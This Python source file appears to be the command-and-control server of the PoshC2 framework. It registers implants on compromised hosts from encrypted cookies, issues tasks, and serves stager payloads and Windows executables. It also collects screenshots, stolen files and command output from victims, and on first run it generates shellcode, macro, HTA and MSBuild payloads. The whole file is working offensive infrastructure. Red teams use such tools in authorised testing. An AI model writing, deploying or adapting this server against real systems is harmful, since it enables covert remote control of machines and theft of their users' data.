#!/usr/bin/env python

import argparse, os, sys, re, datetime, time, base64, BaseHTTPServer, re, logging, ssl, signal

from Implant import * 
from Tasks import *
from Core import *
from Colours import *
from Help import * 
from DB import *
from Payloads import *
from Config import *
from Cert import * 
from Help import *

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def signal_handler(signal, frame):
      sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    def log_message(self, format, *args):
      try:
        useragent = str(self.headers['user-agent'])
      except Exception as e:
        useragent = "None"
      
      open("%swebserver.log" % ROOTDIR, "a").write("%s - [%s] %s %s\n" %
              (self.address_string(),self.log_date_time_string(),format%args, useragent))


    def do_HEAD(s):
        """Respond to a HEAD request."""
        s.server_version = ServerHeader
        s.sys_version = ""
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()

    def do_GET(s):
        """Respond to a GET request."""
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(s.path), str(s.headers))
        new_implant_url = get_newimplanturl()
        s.cookieHeader = s.headers.get('Cookie')
        QuickCommandURI = select_item("QuickCommand", "C2Server")
        s.server_version = ServerHeader
        s.sys_version = ""
        if s.cookieHeader:
          r = ""
        else:
           s.cookieHeader = "NONE"
        # class Tasks()
        
        # implant gets a new task
        new_task = newTask(s.path)

        if new_task:
          s.send_response(200)
          s.send_header("Content-type", "text/html")
          s.end_headers()
          s.wfile.write(new_task)

        elif ("%s_bs" % QuickCommandURI) in s.path:
          filename = "%spayload.bat" % (PayloadsDirectory)
          with open(filename, 'rb') as f:
            content = f.read()
          s.send_response(200)
          s.send_header("Content-type", "text/html")
          s.end_headers()
          s.wfile.write(content)

        elif ("%s_rg" % QuickCommandURI) in s.path:
          filename = "%srg_sct.xml" % (PayloadsDirectory)
          with open(filename, 'rb') as f:
            content = f.read()
          s.send_response(200)
          s.send_header("Content-type", "text/html")
          s.end_headers()
          s.wfile.write(content)

        elif ("%s_cs" % QuickCommandURI) in s.path:
          filename = "%scs_sct.xml" % (PayloadsDirectory)
          with open(filename, 'rb') as f:
            content = f.read()
          s.send_response(200)
          s.send_header("Content-type", "text/html")
          s.end_headers()
          s.wfile.write(content)

        elif ("%s_py" % QuickCommandURI) in s.path:
          filename = "%saes.py" % (PayloadsDirectory)
          with open(filename, 'rb') as f:
            content = f.read()
            content = "a"+"".join("{:02x}".format(ord(c)) for c in content)
          s.send_response(200)
          s.send_header("Content-type", "text/plain")
          s.end_headers()
          s.wfile.write(content)

        elif ("%s_ex" % QuickCommandURI) in s.path:
          filename = "%sPosh32.exe" % (PayloadsDirectory)
          with open(filename, 'rb') as f:
            content = f.read()
          s.send_response(200)
          s.send_header("Content-type", "application/x-msdownload")
          s.end_headers()
          s.wfile.write(content)

        elif ("%s_ex6" % QuickCommandURI) in s.path:
          filename = "%sPosh64.exe" % (PayloadsDirectory)
          with open(filename, 'rb') as f:
            content = f.read()
          s.send_response(200)
          s.send_header("Content-type", "application/x-msdownload")
          s.end_headers()
          s.wfile.write(content)
        # class Implant()
        # register new implant
        elif new_implant_url in s.path and s.cookieHeader.startswith("SessionID"):
          implant_type = "Normal"
          if s.path == ("%s?p" % new_implant_url):
            implant_type = "Proxy"
          if s.path == ("%s?d" % new_implant_url):
            implant_type = "Daisy"
          if s.path == ("%s?m" % new_implant_url):
            implant_type = "OSX"

          if implant_type == "OSX":     
            cookieVal = (s.cookieHeader).replace("SessionID=","")
            decCookie = decrypt(KEY, cookieVal)
            IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
            User,Domain,Hostname,Arch,PID,Proxy = decCookie.split(";")
            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)          
            newImplant.save()
            newImplant.display()
            responseVal = encrypt(KEY, newImplant.PythonCore)

            s.send_response(200)
            s.send_header("Content-type", "text/html")
            s.end_headers()
            s.wfile.write(responseVal)
          else:   
            try: 
              cookieVal = (s.cookieHeader).replace("SessionID=","")
              decCookie = decrypt(KEY, cookieVal)
              Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
              IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
              newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"),User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)        
              newImplant.save()
              newImplant.display()
              newImplant.autoruns()
              responseVal = encrypt(KEY, newImplant.C2Core)

              s.send_response(200)
              s.send_header("Content-type", "text/html")
              s.end_headers()            
              s.wfile.write(responseVal)
            except Exception as e:
              print ("Decryption error: %s" % e)
              s.send_response(404)
              s.send_header("Content-type", "text/html")
              s.end_headers()            
              s.wfile.write(HTTPResponse)
        else: 
          s.send_response(404)
          s.send_header("Content-type", "text/html")
          s.end_headers()
          HTTPResponsePage = select_item("HTTPResponse", "C2Server")
          if HTTPResponsePage:
            s.wfile.write(HTTPResponsePage)
          else:
            s.wfile.write(HTTPResponse)

    def do_POST(s):
        """Respond to a POST request."""
        try:
          s.server_version = ServerHeader
          s.sys_version = ""
          content_length = int(s.headers['Content-Length'])
          s.cookieHeader = s.headers.get('Cookie')
          cookieVal = (s.cookieHeader).replace("SessionID=","")
          post_data = s.rfile.read(content_length)
          logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(s.path), str(s.headers), post_data)
          
          now = datetime.datetime.now()
          result = get_implants_all()
          for i in result:
            implantID = i[0]
            RandomURI = i[1]
            Hostname = i[3]
            encKey = i[5]
            Domain = i[11]
            if RandomURI in s.path and cookieVal:
              decCookie = decrypt(encKey, cookieVal)
              print (Colours.GREEN)
              print ("Command returned against implant %s on host %s %s (%s)" % (implantID,Hostname,Domain,now.strftime("%m/%d/%Y %H:%M:%S")))
              #print decCookie,Colours.END
              rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:]) 
              outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
              outputParsed = outputParsed.rstrip()

              if "ModuleLoaded" in decCookie:
                print ("Module loaded sucessfully")
                insert_completedtask(RandomURI, decCookie, "Module loaded sucessfully", "")
              if "get-screenshot" in decCookie.lower() or "screencapture" in decCookie.lower():
                try:
                  decoded = base64.b64decode(outputParsed) 
                  filename = i[3] + "-" + now.strftime("%m%d%Y%H%M%S_"+randomuri())
                  output_file = open('%s%s.png' % (DownloadsDirectory,filename), 'wb')
                  print ("Screenshot captured: %s%s.png" % (DownloadsDirectory,filename))
                  insert_completedtask(RandomURI, decCookie, "Screenshot captured: %s%s.png" % (DownloadsDirectory,filename), "")
                  output_file.write(decoded)
                  output_file.close()
                except Exception as e:
                  insert_completedtask(RandomURI, decCookie, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!", "")                  
                  print ("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
              elif (decCookie.lower().startswith("$shellcode64")) or (decCookie.lower().startswith("$shellcode64")):
                insert_completedtask(RandomURI, decCookie, "Upload shellcode complete", "")
                print ("Upload shellcode complete")
              elif "download-file" in decCookie.lower():
                try:
                  rawoutput = decrypt_bytes_gzip(encKey, (post_data[1500:]))
                  filename = decCookie.lower().replace("download-file ","")
                  filename = filename.replace("..","")
                  filename = filename.rsplit('/', 1)[-1]
                  filename = filename.rsplit('\\', 1)[-1]
                  filename = filename.rstrip('\x00')
                  chunkNumber = rawoutput[:5]
                  totalChunks = rawoutput[5:10]
                  print ("Download file part %s of %s : %s" % (chunkNumber,totalChunks,filename))
                  insert_completedtask(RandomURI, decCookie, "Download file part %s of %s : %s" % (chunkNumber,totalChunks,filename), "")
                  output_file = open('%s/downloads/%s' % (ROOTDIR,filename), 'a')
                  output_file.write(rawoutput[10:])
                  output_file.close()
                except Exception as e:
                  insert_completedtask(RandomURI, decCookie, "Error downloading file %s " % e, "")                                    
                  print ("Error downloading file %s " % e)
                
              else:
                insert_completedtask(RandomURI, decCookie, outputParsed, "")
                print (Colours.GREEN)
                print (outputParsed + Colours.END)
        except Exception as e:
          e = ""
        finally:
          s.send_response(200)
          s.send_header("Content-type", "text/html")
          s.end_headers()
          s.wfile.write(default_response())

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
      if os.name == 'nt':
        os.system('cls')
      else:
        os.system('clear')
    except Exception as e:
      print ("cls")
    print (chr(27) + "[2J")
    print (Colours.GREEN + logopic)
    print (Colours.END + "")


    # KeyFile = None, CertFile = None, ClientCertCAs = None
    if os.path.isfile(DB):
      print ("Using existing database / project" + Colours.GREEN)
    else:
      print ("Initializing new project folder and database" + Colours.GREEN)
      print ("")
      directory = os.path.dirname(ROOTDIR)
      if not os.path.exists(directory):
        os.makedirs(directory)
        os.makedirs("%s/downloads" % directory)
        os.makedirs("%s/reports" % directory)
        os.makedirs("%s/payloads" % directory)
      initializedb()
      setupserver(HostnameIP,gen_key(),DomainFrontHeader,DefaultSleep,KillDate,HTTPResponse,ROOTDIR,ServerPort,QuickCommand,DownloadURI,"","","",Sounds,APIKEY,MobileNumber,URLS,SocksURLS,Insecure,UserAgent,Referer,APIToken,APIUser,EnableNotifications)

      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
        C2[13], C2[11], "", "", C2[19], C2[20],
        C2[21], get_newimplanturl(), PayloadsDirectory)

      new_urldetails( "default", C2[1], C2[3], "", "", "", "" )
      newPayload.CreateRaw()
      newPayload.CreateDlls()
      newPayload.CreateShellcode()
      newPayload.CreateSCT()
      newPayload.CreateHTA()
      newPayload.CreateCS()
      newPayload.CreateMacro()
      newPayload.CreateEXE()
      newPayload.CreateMsbuild()

      create_self_signed_cert(ROOTDIR)
      newPayload.CreatePython()
      newPayload.WriteQuickstart( directory + '/quickstart.txt' )

    print ("")
    print ("CONNECT URL: "+select_item("HostnameIP", "C2Server")+get_newimplanturl() + Colours.GREEN)
    print ("WEBSERVER Log: %swebserver.log" % ROOTDIR)
    KEY = get_baseenckey()
    print ("")
    print (time.asctime() + "PoshC2 Server Started - %s:%s" % (HOST_NAME, PORT_NUMBER))
    print (Colours.END)

    if (os.path.isfile("%sposh.crt" % ROOTDIR)) and (os.path.isfile("%sposh.key" % ROOTDIR)):
      httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True)
    else:
      raise ValueError("Cannot find the certificate files")
    #logging.basicConfig(level=logging.WARNING) # DEBUG,INFO,WARNING,ERROR,CRITICAL

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print (time.asctime() + "PoshC2 Server Stopped - %s:%s" % (HOST_NAME, PORT_NUMBER))
